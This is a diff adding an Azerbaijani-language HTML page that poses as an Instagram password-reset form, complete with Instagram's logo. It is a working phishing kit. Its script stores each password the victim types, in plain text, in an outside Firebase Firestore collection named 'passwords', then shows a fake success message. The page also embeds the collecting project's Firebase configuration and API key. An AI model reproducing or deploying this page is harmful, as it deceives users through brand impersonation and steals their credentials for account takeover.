@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Şifrəni Yenilə</title>
+    <script src="https://cdn.tailwindcss.com?client"></script>
+    <style>
+        .password-strength {
+            height: 5px;
+            border-radius: 3px;
+            margin-top: 5px;
+            transition: all 0.3s ease;
+        }
+        .strength-weak { background-color: #ff4d4f; width: 33%; }
+        .strength-medium { background-color: #faad14; width: 66%; }
+        .strength-strong { background-color: #52c41a; width: 100%; }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #000000; /* Qara rəng */
+            font-size: 12px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
+        <img
+            src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
+            alt="Instagram Logo"
+            class="mx-auto mb-6 w-44"
+        />
+        <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">
+            Şifrəni Yenilə
+        </h2>
+        <form id="passwordForm">
+            <div class="mb-4 relative">
+                <input
+                    type="password"
+                    id="newPassword"
+                    placeholder="Yeni Şifrə"
+                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
+                    required
+                />
+                <span class="toggle-password" onclick="togglePassword('newPassword')">Göstər</span>
+                <div id="passwordStrength" class="password-strength"></div>
+                <p id="strengthText" class="text-sm text-gray-500 mt-1"></p>
+            </div>
+            <div class="mb-4 relative">
+                <input
+                    type="password"
+                    id="confirmPassword"
+                    placeholder="Şifrəni Təkrar Et"
+                    class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
+                    required
+                />
+                <span class="toggle-password" onclick="togglePassword('confirmPassword')">Göstər</span>
+            </div>
+            <p id="errorMessage" class="text-red-500 text-sm mb-4 hidden"></p>
+            <p id="successMessage" class="text-green-500 text-sm mb-4 hidden">
+                Şifrə uğurla saxlanıldı!
+            </p>
+            <button
+                type="submit"
+                class="w-full bg-blue-500 text-white p-3 rounded-md font-semibold hover:bg-blue-600 transition duration-200"
+            >
+                Şifrəni Dəyiş
+            </button>
+        </form>
+    </div>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
+        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC-QALot6Wp5_mVe4s3ekB8JWq-qDUUOqQ",
+            authDomain: "premiumstore-adece.firebaseapp.com",
+            projectId: "premiumstore-adece",
+            storageBucket: "premiumstore-adece.firebasestorage.app",
+            messagingSenderId: "1058991155256",
+            appId: "1:1058991155256:web:942e3aaa544570355f9ecd",
+            measurementId: "G-2SCDNF8S2R"
+        };
+
+        // Firebase-i başlat
+        let db;
+        try {
+            const app = initializeApp(firebaseConfig);
+            db = getFirestore(app);
+            console.log("Firebase və Firestore uğurla başladı");
+        } catch (error) {
+            console.error("Firebase başlama xətası:", error);
+            document.getElementById('errorMessage').textContent = `Firebase başlama xətası: ${error.message}`;
+            document.getElementById('errorMessage').classList.remove('hidden');
+        }
+
+        function togglePassword(id) {
+            const input = document.getElementById(id);
+            const toggle = input.nextElementSibling;
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggle.textContent = 'Gizlə';
+            } else {
+                input.type = 'password';
+                toggle.textContent = 'Göstər';
+            }
+        }
+
+        const form = document.getElementById('passwordForm');
+        const newPassword = document.getElementById('newPassword');
+        const confirmPassword = document.getElementById('confirmPassword');
+        const errorMessage = document.getElementById('errorMessage');
+        const successMessage = document.getElementById('successMessage');
+        const passwordStrength = document.getElementById('passwordStrength');
+        const strengthText = document.getElementById('strengthText');
+
+        const validatePassword = (password) => {
+            const minLength = 8;
+            let strength = 0;
+            const checks = [
+                password.length >= minLength,
+                /[A-Z]/.test(password),
+                /[0-9]/.test(password),
+                /[!@#$%^&*(),.?":{}|<>]/.test(password)
+            ];
+
+            strength = checks.filter(Boolean).length;
+
+            if (!password) {
+                passwordStrength.className = 'password-strength';
+                strengthText.textContent = '';
+                return { valid: false, message: '' };
+            }
+
+            if (password.length < minLength) {
+                return { valid: false, message: 'Şifrə ən az 8 simvol olmalıdır.' };
+            }
+            if (!/[A-Z]/.test(password)) {
+                return { valid: false, message: 'Şifrədə ən az bir böyük hərf olmalıdır.' };
+            }
+            if (!/[0-9]/.test(password)) {
+                return { valid: false, message: 'Şifrədə ən az bir rəqəm olmalıdır.' };
+            }
+            if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
+                return { valid: false, message: 'Şifrədə ən az bir xüsusi simvol olmalıdır.' };
+            }
+
+            if (strength <= 2) {
+                passwordStrength.className = 'password-strength strength-weak';
+                strengthText.textContent = 'Zəif';
+            } else if (strength === 3) {
+                passwordStrength.className = 'password-strength strength-medium';
+                strengthText.textContent = 'Orta';
+            } else {
+                passwordStrength.className = 'password-strength strength-strong';
+                strengthText.textContent = 'Güclü';
+            }
+
+            return { valid: true, message: '' };
+        };
+
+        newPassword.addEventListener('input', () => {
+            validatePassword(newPassword.value);
+        });
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            errorMessage.classList.add('hidden');
+            successMessage.classList.add('hidden');
+
+            const validation = validatePassword(newPassword.value);
+            if (!validation.valid) {
+                errorMessage.textContent = validation.message;
+                errorMessage.classList.remove('hidden');
+                return;
+            }
+
+            if (newPassword.value !== confirmPassword.value) {
+                errorMessage.textContent = 'Yeni şifrə ilə təkrar şifrə uyğun gəlmir.';
+                errorMessage.classList.remove('hidden');
+                return;
+            }
+
+            try {
+                // Yeni şifrəni Firestore-a mətn kimi saxla
+                const docRef = await addDoc(collection(db, 'passwords'), {
+                    newPassword: newPassword.value,
+                    timestamp: new Date().toISOString()
+                });
+                console.log("Şifrə Firestore-a yazıldı, sənəd ID:", docRef.id);
+                successMessage.textContent = 'Şifrə uğurla saxlanıldı!';
+                successMessage.classList.remove('hidden');
+            } catch (error) {
+                console.error("Firestore-a yazı xətası:", error);
+                errorMessage.textContent = `Xəta baş verdi: ${error.message}`;
+                errorMessage.classList.remove('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
